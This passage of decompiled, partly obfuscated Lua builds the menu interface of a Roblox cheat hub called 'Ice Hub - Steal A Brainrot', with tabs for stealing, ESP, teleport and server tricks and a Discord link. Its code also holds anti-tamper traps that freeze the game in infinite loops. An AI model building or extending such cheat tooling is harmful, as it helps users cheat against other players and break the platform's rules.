							fn37(frame, v82[108], udim2)
						end

						frame.BackgroundTransparency = 1
						frame.BorderSizePixel = 0
						frame.Active = true
						frame.ZIndex = v82[144]
						frame.Parent = screenGui

						for i = 1, 3 do
							do
								local textButton = Instance.new("TextButton")
								textButton.Name = v83()
								textButton.Size = UDim2.new(0, n35, 0, n35)
								textButton.Position = UDim2.new(v82[46], (i - 1) * (n35 + n36), 0, 0)
								textButton.BackgroundColor3 = Color3.fromRGB(8, 41, v82[13])
								textButton.BackgroundTransparency = 0.42
								textButton.BorderSizePixel = 0
								textButton.Text = tostring(i)
								textButton.TextColor3 = tbl17.COL_WHITE
								textButton.TextSize = isMobile and 20 or v82[60]
								textButton.Font = Enum.Font.GothamBold
								textButton.ZIndex = v82[61]
								textButton.AutoButtonColor = false
								textButton.Active = true
								textButton.Visible = tbl18.toggles.unlockBase
								textButton.Parent = frame
								createUICorner(textButton, v82[36])
								createUIStroke(textButton, 2)
								tbl17.topButtons[i] = textButton

								textButton.MouseButton1Click:Connect(function()
									fn49(i)
								end)
							end
						end
					end

					local textButton, v85, v86, v87, v88, v89, v90, v91, fn49, fn50
					local createFrame, createFrame2, fn51, screenGui2, tbl20, fn52

					do
						do
							local n35, instance2

							do
								do
									do
										do
											local flag18 = false
											local v92 = nil
											local position = nil
											local position2 = nil

											local function fn53(input)
												if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
													flag18 = true
													position = input.Position
													position2 = frame.Position

													input.Changed:Connect(function()
														if input.UserInputState == Enum.UserInputState.End then
															flag18 = false
															fn38(frame, v82[108])
														end
													end)
												end
											end

											frame.InputBegan:Connect(fn53)

											for _, topButton in ipairs(tbl17.topButtons) do
												topButton.InputBegan:Connect(fn53)
											end

											frame.InputChanged:Connect(function(input)
												if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
													v92 = input
												end
											end)

											for _, topButton in ipairs(tbl17.topButtons) do
												topButton.InputChanged:Connect(function(input)
													if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
														v92 = input
													end
												end)
											end

											UserInputService.InputChanged:Connect(function(input)
												if not flag18 or input ~= v92 then
													return
												end
												local n36 = input.Position - position
												frame.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n36.X, position2.Y.Scale, position2.Y.Offset + n36.Y)
											end)
										end

										textButton = Instance.new("TextButton")
										textButton.Name = v83()
										textButton.Size = UDim2.new(0, isMobile and 82 or v82[89], v82[46], isMobile and v82[82] or v82[155])
										textButton.Position = UDim2.new(v82[91], -(isMobile and 41 or v82[181]), 0, n33 + hudHeight + v82[61])
										textButton.BackgroundColor3 = Color3.fromRGB(13, 55, 90)
										textButton.BackgroundTransparency = v82[148]
										textButton.BorderSizePixel = 0
										textButton.Text = isMobile and v82[166] or "Menu [T]"
										textButton.TextColor3 = tbl17.COL_WHITE
										textButton.TextSize = isMobile and 12 or v82[78]
										textButton.Font = Enum.Font.GothamBold
										textButton.ZIndex = v82[144]
										textButton.AutoButtonColor = false
										textButton.Active = v82[76]
										textButton.Parent = screenGui
										createUICorner(textButton, 7)
										createUIStroke(textButton, 1)
										tbl17.panel = Instance.new("Frame")
										tbl17.panel.Name = v83()
										tbl17.panel.Size = UDim2.new(v82[46], tbl17.PANEL_W, 0, tbl17.PANEL_H)

										do
											local udim2 = UDim2.new(v82[91], -tbl17.PANEL_W / 2, 0.5, -tbl17.PANEL_H / 2)
											fn37(tbl17.panel, "main", udim2)
										end
									end

									tbl17.panel.BackgroundColor3 = Color3.fromRGB(v82[188], 14, 31)
									tbl17.panel.BackgroundTransparency = v82[3]
									tbl17.panel.BorderSizePixel = 0
									tbl17.panel.Visible = false
									tbl17.panel.ZIndex = 10
									tbl17.panel.Active = true
									tbl17.panel.Parent = screenGui
									createUICorner(tbl17.panel, 18)
									createUIStroke(tbl17.panel, 2)

									do
										local uiGradient = Instance.new("UIGradient")
										local colorSequence = ColorSequence.new
										local tbl21 = {}
										local v92 = ColorSequenceKeypoint.new(0, Color3.fromRGB(6, 14, v82[198]))
										local v93 = ColorSequenceKeypoint.new(v82[43], Color3.fromRGB(8, 28, 59))
										local new = ColorSequenceKeypoint.new
										local color = Color3.fromRGB
										local v94 = v82[61]
										tbl21[1] = v92
										tbl21[2] = v93

										do
											local values = table.pack(new(1, color(v94, 12, 28)))
											table.move(values, 1, values.n, 3, tbl21)
										end

										uiGradient.Color = colorSequence(tbl21)
										uiGradient.Rotation = 135
										uiGradient.Parent = tbl17.panel
									end
								end

								do
									n35 = isMobile and 42 or v82[105]
									instance2 = Instance.new(v82[53])
									instance2.Size = UDim2.new(v82[118], v82[46], v82[46], n35)
									instance2.BackgroundColor3 = Color3.fromRGB(10, 27, 55)
									instance2.BackgroundTransparency = 1
									instance2.BorderSizePixel = 0
									instance2.ZIndex = 11
									instance2.Parent = tbl17.panel
									createUICorner(instance2, 18)

									do
										local frame2 = Instance.new("Frame")
										frame2.Size = UDim2.new(1, 0, 0, 18)
										frame2.Position = UDim2.new(0, 0, 1, -18)
										frame2.BackgroundColor3 = Color3.fromRGB(10, 27, v82[77])
										frame2.BackgroundTransparency = 1
										frame2.BorderSizePixel = 0
										frame2.ZIndex = 11
										frame2.Parent = instance2
									end
								end

								do
									local frame2 = Instance.new("Frame")
									frame2.Size = UDim2.new(1, v82[46], 0, 2)
									frame2.Position = UDim2.new(0, 0, 1, -v82[23])
									frame2.BackgroundColor3 = Color3.fromRGB(95, 175, 255)
									frame2.BackgroundTransparency = 1
									frame2.BorderSizePixel = 0
									frame2.ZIndex = 13
									frame2.Parent = instance2
									local uiGradient = Instance.new("UIGradient")
									local colorSequence = ColorSequence.new
									local tbl21 = {}
									local v92 = ColorSequenceKeypoint.new(v82[46], Color3.fromRGB(45, 115, v82[175]))
									local v93 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(v82[175], v82[151], 255))
									local new = ColorSequenceKeypoint.new
									local color = Color3.fromRGB
									tbl21[1] = v92
									tbl21[2] = v93

									do
										local values = table.pack(new(1, color(70, 145, 255)))
										table.move(values, 1, values.n, 3, tbl21)
									end

									uiGradient.Color = colorSequence(tbl21)
									uiGradient.Parent = frame2
									table.insert(tbl17.allGradients, uiGradient)
								end
							end

							local frame2

							do
								local instance3, n36, instance4

								do
									do
										if v84 then
											local imageLabel = Instance.new("ImageLabel")
											imageLabel.Size = UDim2.new(0, isMobile and v82[153] or 36, 0, isMobile and 32 or 36)
											imageLabel.Position = UDim2.new(v82[46], v82[4], 0.5, isMobile and -16 or -18)
											imageLabel.BackgroundTransparency = 1
											imageLabel.Image = v84
											imageLabel.ScaleType = Enum.ScaleType.Fit
											imageLabel.ZIndex = 15
											imageLabel.Parent = instance2
										else
											local textLabel = Instance.new("TextLabel")
											textLabel.Size = UDim2.new(v82[46], isMobile and 32 or 36, v82[46], isMobile and 32 or 36)
											textLabel.Position = UDim2.new(0, 10, 0.5, isMobile and -16 or -v82[190])
											textLabel.BackgroundColor3 = Color3.fromRGB(12, 45, 92)
											textLabel.BackgroundTransparency = 0.08
											textLabel.Text = "ICE"
											textLabel.TextColor3 = Color3.fromRGB(225, 245, 255)
											textLabel.TextSize = isMobile and v82[36] or 11
											textLabel.Font = Enum.Font.GothamBlack
											textLabel.BorderSizePixel = 0
											textLabel.ZIndex = 15
											textLabel.Parent = instance2
											createUICorner(textLabel, 9)
											createUIStroke(textLabel, 1)
										end

										do
											local textLabel = Instance.new("TextLabel")
											textLabel.Size = UDim2.new(1, -98, v82[118], v82[46])
											textLabel.Position = UDim2.new(v82[46], isMobile and v82[105] or v82[123], v82[46], v82[46])
											textLabel.BackgroundTransparency = 1
											textLabel.Text = "Ice Hub - Steal A Brainrot"
											textLabel.TextColor3 = tbl17.COL_WHITE
											textLabel.TextSize = isMobile and v82[21] or v82[88]
											textLabel.Font = Enum.Font.GothamBlack
											textLabel.TextXAlignment = Enum.TextXAlignment.Left
											textLabel.ZIndex = 14
											textLabel.Parent = instance2
										end
									end

									do
										local textButton2 = Instance.new("TextButton")
										textButton2.Size = UDim2.new(v82[46], isMobile and 25 or v82[155], 0, isMobile and 25 or v82[155])
										textButton2.Position = UDim2.new(v82[118], isMobile and -v82[104] or -38, v82[91], isMobile and -12 or -14)
										textButton2.BackgroundColor3 = Color3.fromRGB(v82[42], 42, 78)
										textButton2.Text = v82[111]
										textButton2.TextColor3 = Color3.fromRGB(180, v82[9], 255)
										textButton2.TextSize = isMobile and 11 or 13
										textButton2.Font = Enum.Font.GothamBlack
										textButton2.BorderSizePixel = 0
										textButton2.AutoButtonColor = false
										textButton2.ZIndex = v82[42]
										textButton2.Parent = instance2
										createUICorner(textButton2, 7)
										createUIStroke(textButton2, 1)

										textButton2.MouseButton1Click:Connect(function()
											tbl17.menuOpen = false
											tbl18.ui.menuOpen = false
											fn36()
											tbl17.panel.Visible = false
										end)
									end

									fn48(tbl17.panel, instance2, v82[22])
									instance3 = Instance.new(v82[53])
									instance3.Size = UDim2.new(1, -16, 1, -(n35 + v82[78]))
									instance3.Position = UDim2.new(v82[46], 8, 0, n35 + 6)
									instance3.BackgroundTransparency = v82[118]
									instance3.ZIndex = v82[185]
									instance3.Parent = tbl17.panel
									n36 = isMobile and 96 or 125
									frame2 = Instance.new("Frame")
									frame2.Size = UDim2.new(0, n36, 1, 0)
									frame2.BackgroundColor3 = Color3.fromRGB(7, 21, 44)
									frame2.BackgroundTransparency = 0.62
									frame2.BorderSizePixel = v82[46]
									frame2.ZIndex = 11
									frame2.Parent = instance3
									frame2.ClipsDescendants = v82[76]
									createUICorner(frame2, 11)
									instance4 = Instance.new(v82[41])
									instance4.Size = UDim2.new(1, -6, v82[118], -94)
									instance4.Position = UDim2.new(0, 3, 0, 4)
									instance4.BackgroundTransparency = v82[118]
									instance4.BorderSizePixel = 0
									instance4.ScrollBarThickness = 0
									instance4.CanvasSize = UDim2.new(v82[46], 0, 0, 0)
									instance4.AutomaticCanvasSize = Enum.AutomaticSize.Y
									instance4.ZIndex = 12
									instance4.Parent = frame2

									do
										local uiListLayout = Instance.new("UIListLayout")
										uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
										uiListLayout.Padding = UDim.new(0, 5)
										uiListLayout.Parent = instance4
									end
								end

								do
									local uiPadding = Instance.new("UIPadding")
									uiPadding.PaddingTop = UDim.new(0, 4)
									uiPadding.PaddingLeft = UDim.new(0, v82[113])
									uiPadding.PaddingRight = UDim.new(0, 3)
									uiPadding.Parent = instance4
								end

								do
									local frame3 = Instance.new("Frame")
									frame3.Size = UDim2.new(v82[46], 2, v82[118], -v82[188])
									frame3.Position = UDim2.new(0, n36 + 5, 0, 3)
									frame3.BackgroundColor3 = Color3.fromRGB(80, 155, 255)
									frame3.BackgroundTransparency = 0.35
									frame3.BorderSizePixel = 0
									frame3.ZIndex = 12
									frame3.Parent = instance3
									local uiGradient = Instance.new("UIGradient")
									uiGradient.Color = ColorSequence.new(tbl17.ACCENT_KEYS)
									uiGradient.Parent = frame3
									table.insert(tbl17.allGradients, uiGradient)
								end

								local frame3 = Instance.new("Frame")
								frame3.Size = UDim2.new(v82[118], -n36 - 15, 1, 0)
								frame3.Position = UDim2.new(0, n36 + 13, 0, v82[46])
								frame3.BackgroundTransparency = 1
								frame3.ZIndex = 11
								frame3.Parent = instance3
								tbl17.tabButtons = {}
								tbl17.tabContents = {}

								for i, v92 in ipairs({
									"Stealer",
									"Helper",
									"ESP",
									v82[56],
									"World",
									"Keybinds",
									"Server",
								}) do
									local textButton2, instance5, textLabel, scrollingFrame

									do
										textButton2 = Instance.new("TextButton")
										textButton2.Size = UDim2.new(1, -v82[23], v82[46], isMobile and 31 or 34)
										textButton2.BackgroundColor3 = Color3.fromRGB(v82[4], 31, 61)
										textButton2.BackgroundTransparency = tbl18.ui.activeTab == v92 and v82[45] or 0.48
										textButton2.BorderSizePixel = 0
										textButton2.Text = ""
										textButton2.AutoButtonColor = false
										textButton2.LayoutOrder = i
										textButton2.ZIndex = 13
										textButton2.Parent = instance4
										createUICorner(textButton2, 8)
										instance5 = Instance.new(v82[53])
										instance5.Size = UDim2.new(0, v82[113], v82[129], 0)
										instance5.Position = UDim2.new(0, v82[46], 0.16, v82[46])
										instance5.BackgroundColor3 = Color3.fromRGB(90, 175, 255)
										instance5.BackgroundTransparency = tbl18.ui.activeTab == v92 and 0 or 1
										instance5.BorderSizePixel = v82[46]
										instance5.ZIndex = 14
										instance5.Parent = textButton2
										createUICorner(instance5, 3)
										textLabel = Instance.new("TextLabel")
										textLabel.Size = UDim2.new(1, -v82[163], 1, 0)
										textLabel.Position = UDim2.new(0, 10, 0, 0)
										textLabel.BackgroundTransparency = 1
										textLabel.Text = v92
										textLabel.TextColor3 = tbl18.ui.activeTab == v92 and tbl17.COL_WHITE or tbl17.COL_DIM
										textLabel.TextSize = isMobile and 10 or 12
										textLabel.Font = tbl18.ui.activeTab == v92 and Enum.Font.GothamBlack or Enum.Font.GothamBold
										textLabel.TextXAlignment = Enum.TextXAlignment.Left
										textLabel.ZIndex = v82[163]
										textLabel.Parent = textButton2
										createUIStroke(textButton2, 1).Transparency = tbl18.ui.activeTab == v92 and v82[18] or 0.8
										scrollingFrame = Instance.new("ScrollingFrame")
										scrollingFrame.Name = v83()
										scrollingFrame.Size = UDim2.new(1, 0, v82[118], 0)
										scrollingFrame.BackgroundTransparency = 1
										scrollingFrame.BorderSizePixel = v82[46]
										scrollingFrame.ScrollBarThickness = isMobile and 4 or 3
										scrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(v82[98], 180, v82[196])
										scrollingFrame.CanvasSize = UDim2.new(0, 0, v82[46], 0)
										scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
										scrollingFrame.Visible = tbl18.ui.activeTab == v92
										scrollingFrame.ZIndex = 12
										scrollingFrame.Parent = frame3

										do
											local instance6 = Instance.new(v82[191])
											instance6.SortOrder = Enum.SortOrder.LayoutOrder
											instance6.Padding = UDim.new(0, 8)
											instance6.Parent = scrollingFrame
										end
									end

									do
										local uiPadding = Instance.new("UIPadding")
										uiPadding.PaddingTop = UDim.new(0, 6)
										uiPadding.PaddingBottom = UDim.new(0, v82[90])
										uiPadding.PaddingLeft = UDim.new(0, 6)
										uiPadding.PaddingRight = UDim.new(0, 8)
										uiPadding.Parent = scrollingFrame
									end

									tbl17.tabButtons[i] = { button = textButton2, indicator = instance5, label = textLabel }
									tbl17.tabContents[i] = scrollingFrame

									textButton2.MouseButton1Click:Connect(function()
										tbl18.ui.activeTab = v92
										fn36()

										for i2, tabButton in ipairs(tbl17.tabButtons) do
											local visible = i2 == i
											tabButton.button.BackgroundTransparency = visible and 0.05 or 0.28
											tabButton.indicator.BackgroundTransparency = visible and v82[46] or 1
											tabButton.label.TextColor3 = visible and tbl17.COL_WHITE or tbl17.COL_DIM
											tabButton.label.Font = visible and Enum.Font.GothamBlack or Enum.Font.GothamBold
											tbl17.tabContents[i2].Visible = visible
										end
									end)
								end
							end

							do
								do
									local frame3

									do
										frame3 = Instance.new("Frame")
										frame3.Name = "IceHubSidebarFooter"
										frame3.Size = UDim2.new(1, -8, v82[46], isMobile and 78 or 86)
										frame3.Position = UDim2.new(0, 4, 1, isMobile and -v82[12] or -90)
										frame3.BackgroundColor3 = Color3.fromRGB(v82[90], v82[82], 55)
										frame3.BackgroundTransparency = 0.58
										frame3.BorderSizePixel = 0
										frame3.ClipsDescendants = true
										frame3.ZIndex = 13
										frame3.Parent = frame2
										createUICorner(frame3, 9)
										createUIStroke(frame3, v82[118]).Transparency = 0.5

										do
											local textLabel = Instance.new("TextLabel")
											textLabel.Size = UDim2.new(1, -8, v82[46], 14)
											textLabel.Position = UDim2.new(0, 4, v82[46], v82[144])
											textLabel.BackgroundTransparency = v82[118]
											textLabel.Text = "Ice Hub"
											textLabel.TextColor3 = Color3.fromRGB(v82[145], 205, 255)
											textLabel.TextSize = isMobile and 8 or 9
											textLabel.Font = Enum.Font.GothamBold
											textLabel.TextXAlignment = Enum.TextXAlignment.Left
											textLabel.ZIndex = v82[42]
											textLabel.Parent = frame3
										end
									end

									if v84 then
										local imageLabel = Instance.new("ImageLabel")
										imageLabel.Size = UDim2.new(v82[46], isMobile and 38 or 44, v82[46], isMobile and v82[87] or 44)
										imageLabel.AnchorPoint = Vector2.new(0.5, 0)
										imageLabel.Position = UDim2.new(v82[91], 0, 0, isMobile and v82[184] or 18)
										imageLabel.BackgroundTransparency = 1
										imageLabel.Image = v84
										imageLabel.ScaleType = Enum.ScaleType.Fit
										imageLabel.ZIndex = 15
										imageLabel.Parent = frame3
									end

									do
										local textLabel = Instance.new("TextLabel")
										textLabel.Size = UDim2.new(1, -v82[90], 0, 12)
										textLabel.Position = UDim2.new(v82[46], 4, 1, -14)
										textLabel.BackgroundTransparency = 1
										textLabel.Text = "discord.gg/icehub"
										textLabel.TextColor3 = tbl17.COL_DIM
										textLabel.TextSize = isMobile and 6 or 8
										textLabel.Font = Enum.Font.GothamBold
										textLabel.TextXAlignment = Enum.TextXAlignment.Center
										textLabel.TextTruncate = Enum.TextTruncate.AtEnd
										textLabel.ZIndex = 15
										textLabel.Parent = frame3
									end
								end

								v85 = tbl17.tabContents[1]
								v86 = tbl17.tabContents[v82[23]]
								v87 = tbl17.tabContents[3]
								v88 = tbl17.tabContents[4]
								v89 = tbl17.tabContents[5]
								v90 = tbl17.tabContents[6]
								v91 = tbl17.tabContents[v82[102]]

								fn49 = function(parent, text)
									local textLabel = Instance.new("TextLabel")
									textLabel.Size = UDim2.new(v82[118], 0, 0, isMobile and 28 or 24)
									textLabel.BackgroundTransparency = 1
									textLabel.Text = text
									textLabel.TextColor3 = tbl17.COL_WHITE
									textLabel.TextSize = isMobile and 14 or 12
									textLabel.Font = Enum.Font.GothamBold
									textLabel.TextXAlignment = Enum.TextXAlignment.Left
									textLabel.ZIndex = 12
									textLabel.LayoutOrder = #parent:GetChildren()
									textLabel.Parent = parent
									local instance3 = Instance.new(v82[53])
									instance3.Size = UDim2.new(1, 0, 0, 1)
									instance3.Position = UDim2.new(v82[46], v82[46], 1, -1)
									instance3.BackgroundColor3 = tbl17.COL_WHITE
									instance3.BorderSizePixel = v82[46]
									instance3.ZIndex = 12
									instance3.Parent = textLabel
								end

								do
									local function fn53(parent, text, arg, arg2)
										local v92 = isMobile and v82[27] or v82[149]
										local instance3 = Instance.new(v82[53])
										instance3.Size = UDim2.new(1, 0, v82[46], v92)
										instance3.BackgroundColor3 = Color3.fromRGB(8, v82[82], 55)
										instance3.BackgroundTransparency = 0.42
										instance3.BorderSizePixel = 0
										instance3.ZIndex = 12
										instance3.LayoutOrder = #parent:GetChildren()
										instance3.Parent = parent
										createUICorner(instance3, v82[90])
										local instance4 = Instance.new(v82[176])
										instance4.Size = UDim2.new(1, -60, 1, 0)
										instance4.Position = UDim2.new(0, 10, v82[46], 0)
										instance4.BackgroundTransparency = 1
										instance4.Text = text
										instance4.TextColor3 = tbl17.COL_WHITE
										instance4.TextSize = isMobile and 15 or 13
										instance4.Font = Enum.Font.GothamBold
										instance4.TextXAlignment = Enum.TextXAlignment.Left
										instance4.ZIndex = 13
										instance4.Parent = instance3
										local n36 = isMobile and 46 or 40
										local n37 = isMobile and v82[58] or 20
										local n38 = isMobile and 20 or 16
										local instance5 = Instance.new(v82[53])
										instance5.Size = UDim2.new(0, n36, v82[46], n37)
										instance5.Position = UDim2.new(v82[118], -n36 - 8, v82[91], -n37 / 2)
										instance5.BackgroundColor3 = Color3.fromRGB(v82[155], 55, 88)
										instance5.BorderSizePixel = 0
										instance5.ZIndex = 13
										instance5.Parent = instance3
										createUICorner(instance5, n37 / 2)
										local instance6 = Instance.new(v82[96])
										local new = ColorSequenceKeypoint.new
										local color = Color3.fromRGB
										instance6.Color = ColorSequence.new({ ColorSequenceKeypoint.new(v82[46], Color3.fromRGB(28, 55, 88)), new(1, color(28, 55, 88)) })
										instance6.Parent = instance5
										local frame3 = Instance.new("Frame")
										frame3.Size = UDim2.new(0, n38, 0, n38)
										frame3.Position = arg and UDim2.new(1, -n38 - v82[23], v82[91], -n38 / v82[23]) or UDim2.new(0, 2, v82[91], -n38 / 2)
										frame3.BackgroundColor3 = tbl17.COL_WHITE
										frame3.BorderSizePixel = 0
										frame3.ZIndex = 14
										frame3.Parent = instance5
										createUICorner(frame3, n38 / 2)
										local flag18 = arg

										local function fn54(arg3)
											pcall(function()
												TweenService:Create(frame3, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {
													Position = arg3 and UDim2.new(1, -n38 - 2, 0.5, -n38 / v82[23]) or UDim2.new(0, 2, 0.5, -n38 / 2),
													BackgroundColor3 = tbl17.COL_WHITE,
												}):Play()
											end)

											if arg3 then
												if v82[115] > n26(2663) then
													instance6.Color = ColorSequence.new(tbl17.ACCENT_KEYS)
													table.insert(tbl17.allGradients, instance6)
												else
													while v82[76] do
													end
												end
											else
												local new2 = ColorSequenceKeypoint.new
												local color2 = Color3.fromRGB
												local v93 = v82[155]
												local v94 = v82[77]
												local v95 = v82[89]

												instance6.Color = ColorSequence.new({
													ColorSequenceKeypoint.new(0, Color3.fromRGB(v82[155], v82[77], 88)),
													new2(1, color2(v93, v94, v95)),
												})

												for i, allGradient in ipairs(tbl17.allGradients) do
													if allGradient == instance6 then
														table.remove(tbl17.allGradients, i)
														break
													end
												end
											end
										end

										fn54(flag18)
										local textButton2 = Instance.new("TextButton")
										textButton2.Size = UDim2.new(v82[118], 0, 1, 0)
										textButton2.BackgroundTransparency = 1
										textButton2.Text = ""
										textButton2.ZIndex = 15
										textButton2.Parent = instance3

										textButton2.MouseButton1Click:Connect(function()
											flag18 = not flag18
											fn54(flag18)

											if arg2 then
												arg2(flag18)
											end
										end)

										return instance3
									end

									fn50 = function(arg, arg2, arg3, arg4)
										return fn53(arg, arg2, tbl18.toggles[arg3] or false, function(arg5)
											tbl18.toggles[arg3] = arg5
											fn36()

											if arg4 then
												arg4(arg5)
											end
										end)
									end
								end
							end
						end

						local fn53, fn54

						do
							createFrame = function(parent, text, arg, arg2)
								local n35 = isMobile and 36 or v82[92]
								local frame2 = Instance.new("Frame")
								frame2.Size = UDim2.new(1, -20, 0, n35)
								frame2.BackgroundColor3 = Color3.fromRGB(8, 27, v82[77])
								frame2.BackgroundTransparency = 0.42
								frame2.BorderSizePixel = 0
								frame2.ZIndex = 11
								frame2.Parent = parent
								createUICorner(frame2, v82[188])
								local textLabel = Instance.new("TextLabel")
								textLabel.Size = UDim2.new(1, -50, 1, 0)
								textLabel.Position = UDim2.new(0, v82[90], 0, 0)
								textLabel.BackgroundTransparency = 1
								textLabel.Text = text
								textLabel.TextColor3 = tbl17.COL_WHITE
								textLabel.TextSize = isMobile and 14 or 12
								textLabel.Font = Enum.Font.GothamBold
								textLabel.TextXAlignment = Enum.TextXAlignment.Left
								textLabel.ZIndex = 12
								textLabel.Parent = frame2
								local n36 = isMobile and 42 or 36
								local n37 = isMobile and 22 or v82[190]
								local n38 = isMobile and v82[190] or 14
								local frame3 = Instance.new("Frame")
								frame3.Size = UDim2.new(0, n36, 0, n37)
								frame3.Position = UDim2.new(v82[118], -n36 - 6, v82[91], -n37 / 2)
								frame3.BackgroundColor3 = Color3.fromRGB(28, 55, 88)
								frame3.BorderSizePixel = 0
								frame3.ZIndex = 12
								frame3.Parent = frame2
								createUICorner(frame3, n37 / 2)
								local uiGradient = Instance.new("UIGradient")
								local new = ColorSequenceKeypoint.new
								local v92 = v82[118]
								local color = Color3.fromRGB
								local v93 = v82[77]
								uiGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(v82[46], Color3.fromRGB(28, 55, 88)), new(v92, color(28, v93, 88)) })
								uiGradient.Parent = frame3
								local frame4 = Instance.new("Frame")
								frame4.Size = UDim2.new(0, n38, 0, n38)
								frame4.Position = arg and UDim2.new(1, -n38 - v82[23], 0.5, -n38 / 2) or UDim2.new(v82[46], 2, 0.5, -n38 / 2)
								frame4.BackgroundColor3 = tbl17.COL_WHITE
								frame4.BorderSizePixel = v82[46]
								frame4.ZIndex = 13
								frame4.Parent = frame3
								createUICorner(frame4, n38 / 2)
								local flag18 = arg

								local function fn55(arg3)
									pcall(function()
										TweenService:Create(frame4, TweenInfo.new(0.15, Enum.EasingStyle.Quad), { Position = arg3 and UDim2.new(1, -n38 - 2, 0.5, -n38 / 2) or UDim2.new(0, v82[23], 0.5, -n38 / 2) }):Play()
									end)

									if arg3 then
										uiGradient.Color = ColorSequence.new(tbl17.ACCENT_KEYS)
										table.insert(tbl17.allGradients, uiGradient)
									else
										local new2 = ColorSequenceKeypoint.new
										local color2 = Color3.fromRGB
										uiGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(28, 55, 88)), new2(1, color2(28, 55, 88)) })

										for i, allGradient in ipairs(tbl17.allGradients) do
											if allGradient == uiGradient then
												table.remove(tbl17.allGradients, i)
												break
											end
										end
									end

									if arg2 then
										if n24 > 9617 then
											while true do
											end
										else
											arg2(arg3)
										end
									end
								end

								fn55(flag18)
								local textButton2 = Instance.new("TextButton")
								textButton2.Size = UDim2.new(1, 0, 1, 0)
								textButton2.BackgroundTransparency = v82[118]
								textButton2.Text = ""
								textButton2.ZIndex = v82[163]
								textButton2.Parent = frame2

								textButton2.MouseButton1Click:Connect(function()
									flag18 = not flag18

									if not (n24 > 9610) then
										if not flag2 then
											return
										end
										fn55(flag18)
										return
									end

									while true do
									end
								end)

								return frame2
							end

							createFrame2 = function(parent, text, arg)
								local frame2 = Instance.new("Frame")
								frame2.Size = UDim2.new(1, 0, 0, isMobile and v82[149] or 30)
								frame2.BackgroundColor3 = Color3.fromRGB(v82[90], 27, v82[77])
								frame2.BackgroundTransparency = v82[101]
								frame2.BorderSizePixel = 0
								frame2.ZIndex = 12
								frame2.LayoutOrder = #parent:GetChildren()
								frame2.Parent = parent
								createUICorner(frame2, 8)
								local textButton2 = Instance.new("TextButton")
								textButton2.Size = UDim2.new(1, v82[46], v82[118], 0)
								textButton2.BackgroundTransparency = 1
								textButton2.Text = text
								textButton2.TextColor3 = tbl17.COL_WHITE
								textButton2.TextSize = isMobile and 14 or v82[78]
								textButton2.Font = Enum.Font.GothamBold
								textButton2.ZIndex = 13
								textButton2.AutoButtonColor = false
								textButton2.Parent = frame2

								textButton2.MouseEnter:Connect(function()
									pcall(function()
										TweenService:Create(frame2, TweenInfo.new(v82[39]), { BackgroundTransparency = 0 }):Play()
									end)
								end)

								textButton2.MouseLeave:Connect(function()
									pcall(function()
										if n26(1572) >= 11671 then
											TweenService:Create(frame2, TweenInfo.new(v82[39]), { BackgroundTransparency = 0.2 }):Play()
											return
										end

										while true do
										end
									end)
								end)

								textButton2.MouseButton1Click:Connect(arg)
								return frame2
							end

							fn51 = function(arg, arg2)
								local scrollingFrame = Instance.new("ScrollingFrame")
								scrollingFrame.Name = "IceHubStage_" .. tostring(arg2)
								scrollingFrame.Size = UDim2.new(v82[118], v82[46], 0, 0)
								scrollingFrame.AutomaticSize = Enum.AutomaticSize.Y
								scrollingFrame.BackgroundTransparency = v82[118]
								scrollingFrame.BorderSizePixel = 0
								scrollingFrame.ScrollBarThickness = 0
								scrollingFrame.CanvasSize = UDim2.new(v82[46], 0, 0, 0)
								scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
								scrollingFrame.Visible = false
								scrollingFrame.Parent = nil
								local uiListLayout = Instance.new("UIListLayout")
								uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
								uiListLayout.Padding = UDim.new(0, 6)
								uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
								uiListLayout.Parent = scrollingFrame
								local uiPadding = Instance.new("UIPadding")
								uiPadding.PaddingTop = UDim.new(v82[46], v82[188])
								uiPadding.PaddingBottom = UDim.new(v82[46], v82[188])
								uiPadding.PaddingLeft = UDim.new(v82[46], 0)
								uiPadding.PaddingRight = UDim.new(0, 0)
								uiPadding.Parent = scrollingFrame

								return nil, scrollingFrame, function()
								end, function()
								end
							end

							screenGui2 = Instance.new("ScreenGui")
							screenGui2.Name = "ICE_HUB_SEMITP_GUI"
							screenGui2:SetAttribute("IceHubOwned", true)
							screenGui2.ResetOnSpawn = v82[120]
							screenGui2.DisplayOrder = 1001
							screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
							fn29(screenGui2)

							task.spawn(function()
								local n35 = isMobile and v82[175] or 250
								local n36 = isMobile and 305 or v82[35]
								local frame2 = Instance.new("Frame")
								frame2.Name = "SemiTPWindow"
								frame2.Size = UDim2.new(v82[46], n35, 0, n36)
								local udim2 = UDim2.new(0.02, 0, 0.5, -n36 / 2)
								fn37(frame2, v82[5], udim2)
								frame2.BackgroundColor3 = Color3.fromRGB(6, 14, v82[198])
								frame2.BackgroundTransparency = 0.6
								frame2.BorderSizePixel = v82[46]
								frame2.Active = true
								frame2.ZIndex = v82[69]
								frame2.Parent = screenGui2
								createUICorner(frame2, 16)
								createUIStroke(frame2, 2)
								local uiGradient = Instance.new("UIGradient")
								local colorSequence = ColorSequence.new
								local tbl21 = {}
								local v92 = ColorSequenceKeypoint.new(0, Color3.fromRGB(6, 14, v82[198]))
								local v93 = ColorSequenceKeypoint.new(v82[43], Color3.fromRGB(9, 31, v82[64]))
								local new = ColorSequenceKeypoint.new
								local color = Color3.fromRGB
								local v94 = v82[61]
								tbl21[1] = v92
								tbl21[2] = v93

								do
									local values = table.pack(new(1, color(v94, 12, 28)))
									table.move(values, 1, values.n, 3, tbl21)
								end

								uiGradient.Color = colorSequence(tbl21)
								uiGradient.Rotation = 135
								uiGradient.Parent = frame2
								local frame3 = Instance.new("Frame")
